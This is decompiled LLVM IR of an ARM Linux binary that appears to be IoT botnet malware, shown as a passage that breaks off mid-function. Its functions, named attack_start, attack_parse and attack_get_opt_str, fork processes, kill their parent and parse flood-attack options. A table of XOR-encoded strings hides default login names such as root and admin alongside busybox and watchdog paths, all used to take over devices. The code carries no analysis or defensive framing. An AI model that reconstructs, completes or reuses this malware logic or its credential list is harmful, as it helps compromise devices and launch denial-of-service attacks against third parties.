source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_22200.22 = global i32 0
@global_var_db14.26 = constant i32 -382906384
@global_var_22424.31 = global i32 0
@global_var_831c.32 = constant i32 -352321547
@global_var_ff00.33 = constant i32 -481165276
@global_var_1358c.34 = constant i32 -382909968
@global_var_bd94.40 = constant i32 -382906384
@global_var_c1cc.42 = constant i32 -382906384
@global_var_b608.44 = constant i32 -382906384
@global_var_af5c.46 = constant i32 -382906384
@global_var_a864.48 = constant i32 -382906384
@global_var_a0b0.50 = constant i32 -382906384
@global_var_9040.53 = constant i32 -382906384
@global_var_89ac.55 = constant i32 -382906384
@global_var_965c.57 = constant i32 -382906384
@global_var_24f40.59 = global i32 0
@global_var_24f48.71 = global i32 0
@global_var_19a78.73 = constant i32 47
@global_var_c707.75 = constant [3 x i8] c"\0AH\00"
@global_var_22428.77 = global i32 0
@global_var_24f44.79 = global i32 0
@global_var_11468.81 = constant i32 -382910336
@global_var_d4a0.82 = constant i32 -509607932
@global_var_d9a0.84 = constant i32 -382910352
@global_var_222b4.86 = global i32 69152
@global_var_222ac.88 = global i32 -1
@global_var_d998.89 = constant i32 139960
@global_var_24f50.94 = local_unnamed_addr global i32 0
@global_var_24f4e.95 = local_unnamed_addr global i32 0
@global_var_2242c.97 = global i32 0
@global_var_19a7c.106 = constant i32 10
@global_var_222b0.108 = global i32 -1
@global_var_14a60.113 = constant i32 -450904024
@global_var_10e20.114 = constant i32 -382910352
@global_var_19a80.118 = constant i32 16777216
@global_var_22434.120 = global i32 0
@global_var_22440.122 = global i32 0
@global_var_22438.124 = global i32 0
@global_var_2243c.126 = global i32 0
@global_var_e998.139 = constant i32 -509607925
@global_var_24f64.141 = global i32 0
@global_var_22478.143 = global i32 0
@global_var_22444.145 = global i32 0
@global_var_22470.147 = global i32 0
@global_var_24f5c.154 = global i32 0
@global_var_24f60.156 = global i32 0
@global_var_2244a.159 = local_unnamed_addr global i32 0
@global_var_2245c.161 = global i32 0
@global_var_2244c.163 = local_unnamed_addr global i32 0
@global_var_22450.164 = local_unnamed_addr global i32 0
@global_var_22451.165 = local_unnamed_addr global i32 0
@global_var_2246a.168 = local_unnamed_addr global i32 0
@global_var_19a88.170 = constant [5 x i8] c"&;; \00"
@global_var_19a8c.172 = constant i32 0
@global_var_19a90.174 = constant [5 x i8] c"5:?;\00"
@global_var_19a98.176 = constant [9 x i8] c"<!: acam\00"
@global_var_19aa4.178 = constant [8 x i8] c"0125!8 \00"
@global_var_fcf8.179 = constant i32 105132
@global_var_19aac.180 = constant [9 x i8] c"$5''#;&0\00"
@global_var_19ab8.182 = constant [6 x i8] c"509=:\00"
@global_var_19ac0.184 = constant [6 x i8] c"\22=.,\22\00"
@global_var_19ac8.186 = constant [8 x i8] c"'!$$;& \00"
@global_var_19ad0.188 = constant i32 423502179
@global_var_19ae0.190 = constant [6 x i8] c"efg`a\00"
@global_var_19ae8.192 = constant [5 x i8] c"!'1&\00"
@global_var_19af0.194 = constant i32 943467547
@global_var_19afc.196 = constant i32 322070023
@global_var_19b08.198 = constant [5 x i8] c"efg`\00"
@global_var_22454.199 = local_unnamed_addr global i32 0
@global_var_22452.200 = local_unnamed_addr global i32 0
@global_var_22458.201 = local_unnamed_addr global i32 0
@global_var_22460.203 = local_unnamed_addr global i32 0
@global_var_2246c.204 = local_unnamed_addr global i32 0
@global_var_eaa8.206 = constant i32 -382910352
@global_var_19b10.208 = constant [3 x i8] c"\0D\0A\00"
@global_var_19b1c.210 = constant i32 2096127
@global_var_19b13.212 = constant i32 2095871
@global_var_24f6c.217 = global i32 0
@global_var_222bc.220 = global i32 -555811921
@global_var_19b20.225 = constant i32 58965
@global_var_24f74.226 = local_unnamed_addr global i32 0
@global_var_24f78.227 = local_unnamed_addr global i32 0
@global_var_19b24.229 = constant [13 x i8] c"&;; 91z78!6T\00"
@global_var_24f7c.230 = local_unnamed_addr global i32 0
@global_var_24f80.231 = local_unnamed_addr global i32 0
@global_var_19b34.233 = constant [13 x i8] c"'1:$5=z'= 1T\00"
@global_var_24f84.234 = local_unnamed_addr global i32 0
@global_var_24f88.235 = local_unnamed_addr global i32 0
@global_var_19b44.237 = constant i32 28654
@global_var_24f8c.238 = local_unnamed_addr global i32 0
@global_var_24f90.239 = local_unnamed_addr global i32 0
@global_var_19b48.241 = constant [37 x i8] c"&;; t'1:$5=t>!' t=:217 10t-;!&t'<= T\00"
@global_var_24f94.242 = local_unnamed_addr global i32 0
@global_var_24f98.243 = local_unnamed_addr global i32 0
@global_var_19b70.245 = constant [7 x i8] c"'<188T\00"
@global_var_24fa0.246 = local_unnamed_addr global i32 0
@global_var_24f9c.247 = local_unnamed_addr global i32 0
@global_var_19b78.249 = constant [8 x i8] c"1:5681T\00"
@global_var_24fa4.250 = local_unnamed_addr global i32 0
@global_var_24fa8.251 = local_unnamed_addr global i32 0
@global_var_19b80.253 = constant [8 x i8] c"'-' 19T\00"
@global_var_24fac.254 = local_unnamed_addr global i32 0
@global_var_24fb0.255 = local_unnamed_addr global i32 0
@global_var_19b88.257 = constant [4 x i8] c"'<T\00"
@global_var_24fb4.258 = local_unnamed_addr global i32 0
@global_var_24fb8.259 = local_unnamed_addr global i32 0
@global_var_19b8c.261 = constant i32 977090171
@global_var_24fbc.262 = local_unnamed_addr global i32 0
@global_var_24fc0.263 = local_unnamed_addr global i32 0
@global_var_10b04.264 = constant i32 105376
@global_var_19ba0.265 = constant i32 102440217
@global_var_24fc8.266 = local_unnamed_addr global i32 0
@global_var_24fc4.267 = local_unnamed_addr global i32 0
@global_var_19bbc.269 = constant [10 x i8] c":7;&&17 T\00"
@global_var_24fcc.270 = local_unnamed_addr global i32 0
@global_var_24fd0.271 = local_unnamed_addr global i32 0
@global_var_19bc8.273 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_24fd4.274 = local_unnamed_addr global i32 0
@global_var_24fd8.275 = local_unnamed_addr global i32 0
@global_var_19bdc.277 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_24fe0.278 = local_unnamed_addr global i32 0
@global_var_24fdc.279 = local_unnamed_addr global i32 0
@global_var_19bf4.281 = constant [8 x i8] c"{$&;7{T\00"
@global_var_24fe4.282 = local_unnamed_addr global i32 0
@global_var_24fe8.283 = local_unnamed_addr global i32 0
@global_var_19bfc.285 = constant [6 x i8] c"{1,1T\00"
@global_var_24fec.286 = local_unnamed_addr global i32 0
@global_var_24ff0.287 = local_unnamed_addr global i32 0
@global_var_19c04.289 = constant [5 x i8] c"{20T\00"
@global_var_24ff8.290 = local_unnamed_addr global i32 0
@global_var_24ff4.291 = local_unnamed_addr global i32 0
@global_var_19c0c.293 = constant [7 x i8] c"{95$'T\00"
@global_var_24ffc.294 = local_unnamed_addr global i32 0
@global_var_25000.295 = local_unnamed_addr global i32 0
@global_var_19c14.297 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_25004.298 = local_unnamed_addr global i32 0
@global_var_25008.299 = local_unnamed_addr global i32 0
@global_var_19c24.301 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_2507c.302 = local_unnamed_addr global i32 0
@global_var_19c30.304 = constant [8 x i8] c"z5:=91T\00"
@global_var_25084.305 = local_unnamed_addr global i32 0
@global_var_19c38.307 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_2500c.308 = local_unnamed_addr global i32 0
@global_var_25010.309 = local_unnamed_addr global i32 0
@global_var_19c4c.311 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_25014.312 = local_unnamed_addr global i32 0
@global_var_25018.313 = local_unnamed_addr global i32 0
@global_var_19c64.315 = constant [9 x i8] c"5''#;&0T\00"
@global_var_2501c.316 = local_unnamed_addr global i32 0
@global_var_25020.317 = local_unnamed_addr global i32 0
@global_var_19c70.319 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_25024.320 = local_unnamed_addr global i32 0
@global_var_25028.321 = local_unnamed_addr global i32 0
@global_var_19c80.323 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_2502c.324 = local_unnamed_addr global i32 0
@global_var_25030.325 = local_unnamed_addr global i32 0
@global_var_19c94.327 = constant [11 x i8] c"0\22&<18$1&T\00"
@global_var_2508c.328 = local_unnamed_addr global i32 0
@global_var_10b48.329 = constant i32 105720
@global_var_19cf8.330 = constant i32 557516544
@global_var_25038.331 = local_unnamed_addr global i32 0
@global_var_25034.332 = local_unnamed_addr global i32 0
@global_var_19ca0.334 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_2503c.335 = local_unnamed_addr global i32 0
@global_var_25040.336 = local_unnamed_addr global i32 0
@global_var_19cb4.338 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_25044.339 = local_unnamed_addr global i32 0
@global_var_25048.340 = local_unnamed_addr global i32 0
@global_var_2504c.341 = local_unnamed_addr global i32 0
@global_var_25050.342 = local_unnamed_addr global i32 0
@global_var_25054.343 = local_unnamed_addr global i32 0
@global_var_25058.344 = local_unnamed_addr global i32 0
@global_var_19cc4.346 = constant [9 x i8] c"$662*7!E\00"
@global_var_2505c.347 = local_unnamed_addr global i32 0
@global_var_25060.348 = local_unnamed_addr global i32 0
@global_var_19cd0.350 = constant [6 x i8] c";3=:T\00"
@global_var_25068.351 = local_unnamed_addr global i32 0
@global_var_25064.352 = local_unnamed_addr global i32 0
@global_var_19cd8.354 = constant [7 x i8] c"1: 1&T\00"
@global_var_2506c.355 = local_unnamed_addr global i32 0
@global_var_19ce0.357 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_25074.358 = local_unnamed_addr global i32 0
@global_var_11028.360 = constant i32 -352321437
@global_var_22204.365 = global i32 0
@global_var_10d8c.374 = constant i32 -1174405112
@global_var_117c0.389 = constant i32 -443088884
@global_var_11c5c.405 = constant i32 -456978431
@global_var_10368.420 = constant i32 -509607928
@global_var_10324.422 = constant i32 -352321456
@global_var_fed0.445 = constant i32 -481099714
@global_var_1254c.452 = constant i32 -478871519
@global_var_12ff0.469 = constant i32 -478805983
@global_var_133d8.479 = constant i32 -382906384
@global_var_154e0.488 = constant i32 -442544040
@global_var_13d70.511 = constant i32 -369098502
@global_var_14744.525 = constant i32 -382910288
@global_var_148f4.538 = constant i32 -2020859901
@global_var_149e0.541 = constant i32 -494075872
@global_var_1162c.542 = constant i32 -382910336
@global_var_2541c.545 = local_unnamed_addr global i32 0
@global_var_13808.559 = constant i32 -442543860
@global_var_11bc0.567 = constant i32 -369093146
@global_var_cef8.584 = constant [3 x i8] c"d\0D\00"
@global_var_cce0.594 = constant i32 -528220150
@global_var_159d8.595 = constant i32 -382910352
@global_var_ca44.604 = constant i32 -509607927
@global_var_16de8.617 = constant i32 -382906384
@global_var_bb84.635 = constant i32 -494075848
@global_var_168a8.646 = constant i32 -382910448
@global_var_18298.647 = constant i32 -382909968
@global_var_189d4.708 = constant i32 -481296376
@global_var_18acc.709 = constant i32 -481296376
@global_var_18b50.710 = constant i32 -369098732
@global_var_22404.12 = external global i8*
@global_var_22420.29 = external global i8*
@global_var_22421.38 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_222b8.90 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24f4c.93 = global i16* null
@global_var_e800.100 = constant i16 9
@global_var_22430.111 = external global i8*
@global_var_22474.149 = global i16* null
@global_var_22448.158 = external global i8*
@global_var_22468.162 = local_unnamed_addr global i8 0
@global_var_2245e.166 = local_unnamed_addr global i16 0
@global_var_22469.167 = local_unnamed_addr global i8 0
@global_var_2225c.361 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_22404.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_22404.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_22404.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_22200.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_22200.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_22200.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_db14.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 105064, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_22420.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_22424.31 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_22424.31, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v4_8368 = mul i32 %v2_834c, 16777216
  %v5_8368 = or i32 %v5_8360, %v4_8368
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
